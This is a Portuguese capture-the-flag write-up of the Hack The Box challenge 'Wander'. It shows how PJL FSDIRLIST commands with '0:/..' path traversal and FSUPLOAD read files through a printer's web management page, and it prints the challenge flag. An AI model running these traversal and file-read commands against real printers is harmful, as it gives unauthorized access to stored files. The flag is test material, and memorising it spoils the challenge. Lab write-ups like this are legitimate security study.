# Write-Up: Wander

## **Descrição do Desafio**

**Nome:** **Wander**

**Plataforma:** Hack The Box

**Categoria:** Hacking

**Dificuldade:** Fácil

**Data:** Novembro/2024

**Descrição:**

> Você está tentando acessar uma impressora bloqueada por um PIN e, para isso, encontrou um servidor web de gerenciamento da impressora. O responsável pelo bloqueio, seu tio, está fora de férias e você precisa desbloquear a impressora para poder imprimir documentos. O desafio é descobrir como acessar o sistema e obter o PIN necessário para liberar a impressora, levando em consideração que o gerenciamento da impressora é feito através desse servidor web.
> 

---

## **Passo a Passo da Solução**

### **1. Análise Inicial**

- Inicialmente, é fornecido apenas um endereço IP e uma porta, mas não é possível acessar esse endereço diretamente via netcat. Então, utilizo o navegador para acessar o site. Ao acessar o endereço, sou redirecionado para uma página de configuração de impressora.

![image.png](images/image.png)

- Explorando o sistema, é possível encontrar a página **Job Controls**, onde é possível interagir com o sistema da impressora utilizando uma linguagem de comandos de controle de impressora chamada **Printer Job Language** (PJL).

![image.png](images/image%201.png)

### **2. Entendendo a Printer Job Language** (PJL).

Quando encontro a página Job Controls, é possível perceber no formulário o seguinte comando: `@PJL INFO ID`, pesquisando o que seria PJL, encontro este site: [Print Job Language (PJL) | hp’s Developer Portal](https://developers.hp.com/hp-printer-command-languages-pcl/doc/print-job-language-pjl) com um documento que contém informações sobre **Printer Job Language** (PJL).

As principais funções são:

- FSAPPEND
- FSDIRLIST
- FSDELETE
- FSDOWNLOAD

- FSINIT
- FSMKDIR
- FSQUERY
- FSUPLOAD

Cada função apresenta uma sintaxe diferente que deve ser conferida no documento.

### **3.  Encontrando a Flag**

Dentro do terminal da impressora iremos usar as seguintes funções:

`@PJL FSDIRLIST NAME=”PATH”`

`@PJL FSUPLOAD NAME=”PATH”`

Começando a navegar no terminal com o comando `@PJL FSDIRLIST NAME="0:/.."` , é exibido os seguintes diretórios.

![image.png](images/image%202.png)

Navegando para o diretório home com `@PJL FSDIRLIST NAME="0:/../home"` , encontramos outro diretório chamado default.

![image.png](images/image%203.png)

Acessando o diretório default com `@PJL FSDIRLIST NAME="0:/../home/default"`, há um arquivo chamado readyjob.

![image.png](images/image%204.png)

Para ler esse arquivo é preciso usar a função `@PJL FSUPLOAD NAME="0:/../home/default/readyjob"` , onde é possível encontrar a flag.

![image.png](images/image%205.png)

**Flag:**

`HTB{w4lk_4nd_w0nd3r}`
